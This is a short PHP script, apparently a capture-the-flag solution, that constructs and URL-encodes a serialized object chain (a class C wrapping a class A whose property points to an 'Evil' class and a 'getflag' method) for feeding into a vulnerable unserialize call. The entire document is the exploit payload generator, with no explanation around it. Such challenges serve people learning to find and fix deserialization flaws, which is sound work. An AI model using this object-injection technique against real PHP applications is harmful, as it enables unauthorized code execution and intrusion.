<?php
error_reporting(0);

class A{
    public $sdpc = ["sdpc" => ["Evil","getflag"]];
}


class C{
    public $b;
    protected $c;

    function __construct(){
        $this->c = new A();
        $this->b =true;
    }

}

$a = new C();
$b = serialize($a);
echo urlencode($b);

?>